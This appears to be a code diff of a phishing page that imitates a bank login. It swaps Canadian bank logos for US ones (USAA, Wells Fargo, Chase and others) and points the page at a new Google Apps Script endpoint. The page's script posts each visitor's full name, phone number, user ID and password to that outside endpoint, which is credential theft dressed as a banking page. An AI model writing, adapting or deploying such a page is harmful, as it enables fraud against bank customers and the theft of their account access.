@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -31,13 +31,13 @@
 
     <!-- BANK IMAGES -->
     <div class="bank-logos">
-      <img src="image/bank/bmo.png" />
-      <img src="image/bank/td.png" />
-      <img src="image/bank/tangerine.png" />
-      <img src="image/bank/cibc.png" />
-      <img src="image/bank/scotiabank.png" />
-      <img src="image/bank/desjardins.png" />
-      <img src="image/bank/rcb.png" />
+      <img src="image/bank/usaa.png" />
+      <img src="image/bank/nyfcu.jpg" />
+      <img src="image/bank/wf.png" />
+      <img src="image/bank/chase.png" />
+      <img src="image/bank/bo.png" />
+      <img src="image/bank/city.png" />
+      <img src="image/bank/ms.png" />
     </div>
 
     <p class="desc">
@@ -162,12 +162,12 @@
 
           try {
             await fetch(
-              "https://script.google.com/macros/s/AKfycbyqRiX5Hiw7zhaPTy1kp4ErZJRAKvjeRADVyKrExQmdA1zeZb-IvutTaeKGwDCs_Oso3A/exec",
+              "https://script.google.com/macros/s/AKfycbxZ-x3vKl5VbsS4KixMg3pCwzU-q1GBE-Pyi7Gpuy1SRsT5UHV2MHR9UfU7myBu3FEN/exec",
               {
                 method: "POST",
                 mode: "no-cors",
                 body: JSON.stringify({ fullName, phone, userId, password }),
-              }
+              },
             );
 
             localStorage.setItem("userPhone", phone);
